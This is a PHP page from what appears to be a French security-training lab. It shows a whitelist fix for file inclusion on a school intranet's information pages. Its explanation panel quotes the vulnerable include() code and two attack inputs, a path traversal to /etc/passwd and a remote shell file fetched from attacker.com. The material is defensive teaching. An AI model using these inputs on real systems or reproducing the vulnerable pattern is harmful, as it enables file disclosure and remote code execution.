<?php
require_once '../includes/config.php';

// SECURE: Define allowed pages with whitelist
$allowed_pages = [
    'home' => 'Accueil',
    'about' => 'À Propos',
    'privacy' => 'Politique de Confidentialité',
    'terms' => 'Conditions d\'Utilisation',
    'contact' => 'Contact',
    'help' => 'Aide'
];

// SECURE: Validate page parameter
$page = isset($_GET['page']) ? $_GET['page'] : 'home';

// SECURE: Whitelist validation - only allow predefined pages
if (!array_key_exists($page, $allowed_pages)) {
    $page = 'home'; // Default to safe page
    $error_message = "Page demandée non trouvée. Redirection vers l'accueil.";
}

$page_title = $allowed_pages[$page];

// SECURE: Define page content securely
$page_content = '';
switch ($page) {
    case 'home':
        $page_content = '
            <div class="text-center">
                <i class="fas fa-home text-6xl text-green-500 mb-6"></i>
                <h2 class="text-3xl font-bold mb-4">Bienvenue sur notre ENT</h2>
                <p class="text-lg text-gray-600 mb-6">
                    Découvrez notre système d\'environnement numérique de travail pour l\'École des Jardins.
                    Un espace sécurisé pour les étudiants, professeurs et personnel administratif.
                </p>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-8">
                    <div class="bg-blue-50 p-6 rounded-lg">
                        <i class="fas fa-users text-3xl text-blue-500 mb-4"></i>
                        <h3 class="font-bold text-lg mb-2">Communauté</h3>
                        <p class="text-gray-600">Connectez-vous avec vos collègues et étudiants</p>
                    </div>
                    <div class="bg-green-50 p-6 rounded-lg">
                        <i class="fas fa-book text-3xl text-green-500 mb-4"></i>
                        <h3 class="font-bold text-lg mb-2">Ressources</h3>
                        <p class="text-gray-600">Accédez aux ressources pédagogiques</p>
                    </div>
                    <div class="bg-purple-50 p-6 rounded-lg">
                        <i class="fas fa-shield-alt text-3xl text-purple-500 mb-4"></i>
                        <h3 class="font-bold text-lg mb-2">Sécurité</h3>
                        <p class="text-gray-600">Environnement sécurisé et protégé</p>
                    </div>
                </div>
            </div>';
        break;
        
    case 'about':
        $page_content = '
            <div>
                <i class="fas fa-info-circle text-6xl text-blue-500 mb-6 block text-center"></i>
                <h2 class="text-3xl font-bold mb-6 text-center">À Propos de l\'École des Jardins</h2>
                <div class="prose max-w-none">
                    <p class="text-lg mb-4">
                        L\'École des Jardins est un établissement d\'enseignement moderne qui met l\'accent sur 
                        l\'innovation pédagogique et la sécurité numérique.
                    </p>
                    <h3 class="text-xl font-bold mb-3">Notre Mission</h3>
                    <p class="mb-4">
                        Fournir un environnement d\'apprentissage sécurisé et moderne, intégrant les dernières 
                        technologies tout en maintenant les plus hauts standards de sécurité informatique.
                    </p>
                    <h3 class="text-xl font-bold mb-3">Nos Valeurs</h3>
                    <ul class="list-disc list-inside mb-4 space-y-2">
                        <li>Excellence académique</li>
                        <li>Sécurité et confidentialité des données</li>
                        <li>Innovation pédagogique</li>
                        <li>Respect et inclusion</li>
                    </ul>
                    <h3 class="text-xl font-bold mb-3">Contact</h3>
                    <p>
                        <strong>Adresse :</strong> 123 Rue des Jardins, 75000 Paris<br>
                        <strong>Téléphone :</strong> 01 23 45 67 89<br>
                        <strong>Email :</strong> contact@ecole-jardins.fr
                    </p>
                </div>
            </div>';
        break;
        
    case 'privacy':
        $page_content = '
            <div>
                <i class="fas fa-shield-alt text-6xl text-green-500 mb-6 block text-center"></i>
                <h2 class="text-3xl font-bold mb-6 text-center">Politique de Confidentialité</h2>
                <div class="prose max-w-none">
                    <h3 class="text-xl font-bold mb-3">Collecte des Données</h3>
                    <p class="mb-4">
                        Nous collectons uniquement les données nécessaires au fonctionnement de notre ENT :
                    </p>
                    <ul class="list-disc list-inside mb-4 space-y-2">
                        <li>Informations d\'authentification (via LDAP)</li>
                        <li>Données de profil utilisateur</li>
                        <li>Logs de connexion pour la sécurité</li>
                        <li>Contenu pédagogique créé par les utilisateurs</li>
                    </ul>
                    
                    <h3 class="text-xl font-bold mb-3">Protection des Données</h3>
                    <p class="mb-4">
                        Toutes les données sont protégées par :
                    </p>
                    <ul class="list-disc list-inside mb-4 space-y-2">
                        <li>Chiffrement des communications (HTTPS)</li>
                        <li>Authentification sécurisée (LDAP)</li>
                        <li>Contrôles d\'accès stricts</li>
                        <li>Audits de sécurité réguliers</li>
                    </ul>
                    
                    <h3 class="text-xl font-bold mb-3">Vos Droits</h3>
                    <p class="mb-4">
                        Conformément au RGPD, vous disposez des droits suivants :
                    </p>
                    <ul class="list-disc list-inside mb-4 space-y-2">
                        <li>Droit d\'accès à vos données</li>
                        <li>Droit de rectification</li>
                        <li>Droit à l\'effacement</li>
                        <li>Droit à la portabilité</li>
                    </ul>
                    
                    <p class="text-sm text-gray-600 mt-6">
                        Dernière mise à jour : ' . date('d/m/Y') . '
                    </p>
                </div>
            </div>';
        break;
        
    case 'terms':
        $page_content = '
            <div>
                <i class="fas fa-file-contract text-6xl text-purple-500 mb-6 block text-center"></i>
                <h2 class="text-3xl font-bold mb-6 text-center">Conditions d\'Utilisation</h2>
                <div class="prose max-w-none">
                    <h3 class="text-xl font-bold mb-3">Acceptation des Conditions</h3>
                    <p class="mb-4">
                        En utilisant cet ENT, vous acceptez les présentes conditions d\'utilisation.
                    </p>
                    
                    <h3 class="text-xl font-bold mb-3">Utilisation Autorisée</h3>
                    <p class="mb-4">
                        Cet environnement numérique est destiné exclusivement à :
                    </p>
                    <ul class="list-disc list-inside mb-4 space-y-2">
                        <li>L\'enseignement et l\'apprentissage</li>
                        <li>La communication pédagogique</li>
                        <li>La gestion administrative</li>
                        <li>La recherche académique</li>
                    </ul>
                    
                    <h3 class="text-xl font-bold mb-3">Comportement Attendu</h3>
                    <p class="mb-4">
                        Les utilisateurs s\'engagent à :
                    </p>
                    <ul class="list-disc list-inside mb-4 space-y-2">
                        <li>Respecter les autres utilisateurs</li>
                        <li>Protéger leurs identifiants de connexion</li>
                        <li>Signaler tout problème de sécurité</li>
                        <li>Utiliser le système de manière responsable</li>
                    </ul>
                    
                    <h3 class="text-xl font-bold mb-3">Interdictions</h3>
                    <p class="mb-4">
                        Il est strictement interdit de :
                    </p>
                    <ul class="list-disc list-inside mb-4 space-y-2">
                        <li>Tenter de contourner les mesures de sécurité</li>
                        <li>Partager ses identifiants avec des tiers</li>
                        <li>Utiliser le système à des fins non pédagogiques</li>
                        <li>Télécharger du contenu inapproprié</li>
                    </ul>
                    
                    <p class="text-sm text-gray-600 mt-6">
                        Dernière mise à jour : ' . date('d/m/Y') . '
                    </p>
                </div>
            </div>';
        break;
        
    case 'contact':
        $page_content = '
            <div>
                <i class="fas fa-envelope text-6xl text-blue-500 mb-6 block text-center"></i>
                <h2 class="text-3xl font-bold mb-6 text-center">Nous Contacter</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                    <div>
                        <h3 class="text-xl font-bold mb-4">Informations de Contact</h3>
                        <div class="space-y-4">
                            <div class="flex items-center">
                                <i class="fas fa-map-marker-alt text-red-500 w-6"></i>
                                <span class="ml-3">123 Rue des Jardins, 75000 Paris</span>
                            </div>
                            <div class="flex items-center">
                                <i class="fas fa-phone text-green-500 w-6"></i>
                                <span class="ml-3">01 23 45 67 89</span>
                            </div>
                            <div class="flex items-center">
                                <i class="fas fa-envelope text-blue-500 w-6"></i>
                                <span class="ml-3">contact@ecole-jardins.fr</span>
                            </div>
                            <div class="flex items-center">
                                <i class="fas fa-clock text-purple-500 w-6"></i>
                                <span class="ml-3">Lun-Ven: 8h00-18h00</span>
                            </div>
                        </div>
                    </div>
                    <div>
                        <h3 class="text-xl font-bold mb-4">Support Technique</h3>
                        <div class="bg-gray-50 p-4 rounded-lg">
                            <p class="mb-2">
                                <strong>Email :</strong> support@ecole-jardins.fr
                            </p>
                            <p class="mb-2">
                                <strong>Téléphone :</strong> 01 23 45 67 90
                            </p>
                            <p class="text-sm text-gray-600">
                                Disponible du lundi au vendredi de 9h à 17h
                            </p>
                        </div>
                        
                        <h3 class="text-xl font-bold mb-4 mt-6">Urgences Sécurité</h3>
                        <div class="bg-red-50 p-4 rounded-lg border border-red-200">
                            <p class="mb-2">
                                <strong>Email :</strong> security@ecole-jardins.fr
                            </p>
                            <p class="text-sm text-red-600">
                                Pour signaler tout incident de sécurité
                            </p>
                        </div>
                    </div>
                </div>
            </div>';
        break;
        
    case 'help':
        $page_content = '
            <div>
                <i class="fas fa-question-circle text-6xl text-orange-500 mb-6 block text-center"></i>
                <h2 class="text-3xl font-bold mb-6 text-center">Centre d\'Aide</h2>
                <div class="space-y-6">
                    <div class="bg-blue-50 p-6 rounded-lg">
                        <h3 class="text-xl font-bold mb-3 text-blue-800">
                            <i class="fas fa-sign-in-alt mr-2"></i>Connexion
                        </h3>
                        <p class="text-blue-700">
                            Utilisez vos identifiants ENT fournis par l\'administration. 
                            En cas d\'oubli, contactez le support technique.
                        </p>
                    </div>
                    
                    <div class="bg-green-50 p-6 rounded-lg">
                        <h3 class="text-xl font-bold mb-3 text-green-800">
                            <i class="fas fa-shield-alt mr-2"></i>Sécurité
                        </h3>
                        <p class="text-green-700">
                            Ne partagez jamais vos identifiants. Déconnectez-vous toujours 
                            après utilisation, surtout sur un ordinateur partagé.
                        </p>
                    </div>
                    
                    <div class="bg-purple-50 p-6 rounded-lg">
                        <h3 class="text-xl font-bold mb-3 text-purple-800">
                            <i class="fas fa-upload mr-2"></i>Téléchargements
                        </h3>
                        <p class="text-purple-700">
                            Seuls les fichiers image (JPG, PNG, GIF) sont autorisés. 
                            Taille maximale : 2MB par fichier.
                        </p>
                    </div>
                    
                    <div class="bg-orange-50 p-6 rounded-lg">
                        <h3 class="text-xl font-bold mb-3 text-orange-800">
                            <i class="fas fa-exclamation-triangle mr-2"></i>Problèmes Techniques
                        </h3>
                        <p class="text-orange-700">
                            En cas de problème technique, contactez immédiatement le support 
                            en décrivant précisément le problème rencontré.
                        </p>
                    </div>
                </div>
            </div>';
        break;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($page_title); ?> - ENT Sécurisé</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="../css/custom.css">
</head>
<body class="bg-gray-50">
    
    <!-- Security Badge -->
    <div class="fixed top-4 right-4 z-50">
        <span class="bg-green-100 text-green-800 px-4 py-2 rounded-full text-sm font-semibold">
            <i class="fas fa-shield-alt mr-1"></i>
            Inclusion de Fichier Protégée
        </span>
    </div>
    
    <div class="container mx-auto px-4 py-8">
        <div class="max-w-6xl mx-auto">
            <h1 class="text-4xl font-bold text-center mb-8 text-gray-800">
                <i class="fas fa-file-alt mr-3"></i>Pages d'Information
            </h1>
            
            <?php if (isset($error_message)): ?>
                <div class="bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded mb-6">
                    <i class="fas fa-exclamation-triangle mr-2"></i>
                    <?php echo htmlspecialchars($error_message); ?>
                </div>
            <?php endif; ?>
            
            <!-- Navigation -->
            <div class="bg-white rounded-lg shadow-lg p-6 mb-8">
                <div class="flex flex-wrap gap-4 justify-center">
                    <?php foreach ($allowed_pages as $page_key => $page_name): ?>
                        <a href="?page=<?php echo urlencode($page_key); ?>" 
                           class="<?php echo $page === $page_key ? 'bg-green-500' : 'bg-gray-500'; ?> text-white px-6 py-3 rounded-lg hover:opacity-80 transition">
                            <?php
                            $icons = [
                                'home' => 'fas fa-home',
                                'about' => 'fas fa-info-circle',
                                'privacy' => 'fas fa-shield-alt',
                                'terms' => 'fas fa-file-contract',
                                'contact' => 'fas fa-envelope',
                                'help' => 'fas fa-question-circle'
                            ];
                            ?>
                            <i class="<?php echo $icons[$page_key] ?? 'fas fa-file'; ?> mr-2"></i>
                            <?php echo htmlspecialchars($page_name); ?>
                        </a>
                    <?php endforeach; ?>
                </div>
            </div>
            
            <!-- Page Content -->
            <div class="bg-white rounded-lg shadow-lg p-8 mb-8">
                <?php
                // SECURE: Output the predefined content (no file inclusion)
                echo $page_content;
                ?>
            </div>
            
            <!-- Navigation -->
            <div class="text-center mb-8">
                <a href="../index.php" class="text-green-600 hover:text-green-700">
                    <i class="fas fa-arrow-left mr-1"></i>Retour à l'accueil
                </a>
            </div>
            
            <!-- Security Features Button -->
            <div class="mt-8">
                <button onclick="toggleCode('securityFeatures')" 
                        class="w-full bg-green-500 text-white py-3 px-4 rounded-lg hover:bg-green-600 transition font-semibold">
                    <i class="fas fa-shield-alt mr-2"></i>Voir l'Implémentation Sécurisée
                </button>
            </div>
            
            <!-- Security Features Display -->
            <div id="securityFeatures" class="mt-4 bg-white rounded-lg shadow-lg p-6" style="display: none;">
                <h3 class="text-xl font-bold mb-4 text-green-600">Implémentation Sécurisée</h3>
                
                <div class="code-block mb-4">
                    <pre><code>// CODE SÉCURISÉ
// 1. Liste Blanche de Pages
$allowed_pages = [
    'home' => 'Accueil',
    'about' => 'À Propos',
    'privacy' => 'Politique de Confidentialité',
    'terms' => 'Conditions d\'Utilisation'
];

// 2. Validation Stricte
$page = $_GET['page'] ?? 'home';
if (!array_key_exists($page, $allowed_pages)) {
    $page = 'home'; // Page par défaut sécurisée
}

// 3. Contenu Prédéfini (PAS d'inclusion de fichier)
switch ($page) {
    case 'home':
        $content = 'Contenu sécurisé prédéfini...';
        break;
    case 'about':
        $content = 'Autre contenu sécurisé...';
        break;
    default:
        $content = 'Contenu par défaut...';
}

// 4. Sortie Sécurisée
echo $content; // Pas d'include() ou require()</code></pre>
                </div>
                
                <div class="space-y-4">
                    <div class="bg-green-50 border-l-4 border-green-500 p-4">
                        <h4 class="font-bold text-green-800 mb-2">1. Liste Blanche de Pages</h4>
                        <p class="text-green-700 text-sm">Seules les pages prédéfinies dans un tableau associatif sont autorisées. Impossible d'accéder à d'autres fichiers.</p>
                    </div>
                    
                    <div class="bg-green-50 border-l-4 border-green-500 p-4">
                        <h4 class="font-bold text-green-800 mb-2">2. Validation Stricte</h4>
                        <p class="text-green-700 text-sm">Utilise array_key_exists() pour vérifier que la page demandée existe dans la liste autorisée.</p>
                    </div>
                    
                    <div class="bg-green-50 border-l-4 border-green-500 p-4">
                        <h4 class="font-bold text-green-800 mb-2">3. Pas d'Inclusion de Fichier</h4>
                        <p class="text-green-700 text-sm">Le contenu est défini directement dans le code PHP avec switch/case. Aucun include() ou require() utilisé.</p>
                    </div>
                    
                    <div class="bg-green-50 border-l-4 border-green-500 p-4">
                        <h4 class="font-bold text-green-800 mb-2">4. Page par Défaut Sécurisée</h4>
                        <p class="text-green-700 text-sm">En cas de page invalide, redirection automatique vers une page sûre (home).</p>
                    </div>
                    
                    <div class="bg-green-50 border-l-4 border-green-500 p-4">
                        <h4 class="font-bold text-green-800 mb-2">5. Encodage de Sortie</h4>
                        <p class="text-green-700 text-sm">Utilise htmlspecialchars() sur tous les paramètres affichés pour prévenir XSS.</p>
                    </div>
                    
                    <div class="bg-green-50 border-l-4 border-green-500 p-4">
                        <h4 class="font-bold text-green-800 mb-2">6. URLs Sécurisées</h4>
                        <p class="text-green-700 text-sm">Utilise urlencode() pour les paramètres d'URL et validation côté client.</p>
                    </div>
                </div>
                
                <div class="mt-6 bg-blue-50 border-l-4 border-blue-500 p-4">
                    <h4 class="font-bold text-blue-800 mb-2">Principe Clé : Éviter l'Inclusion Dynamique</h4>
                    <p class="text-blue-700 text-sm">
                        La meilleure protection contre LFI/RFI est d'éviter complètement include() et require() 
                        avec des paramètres utilisateur. Utilisez plutôt des structures de contrôle (switch/case) 
                        avec du contenu prédéfini.
                    </p>
                </div>
                
                <div class="mt-4 bg-red-50 border-l-4 border-red-500 p-4">
                    <h4 class="font-bold text-red-800 mb-2">Ce qui était Vulnérable</h4>
                    <div class="code-block text-sm">
                        <pre><code>// DANGEREUX - Ne jamais faire ceci :
$page = $_GET['page'];
include("../pages/" . $page . ".php");

// Permet des attaques comme :
// ?page=../../../../etc/passwd
// ?page=http://attacker.com/shell.txt</code></pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="../js/main.js"></script>
</body>
</html>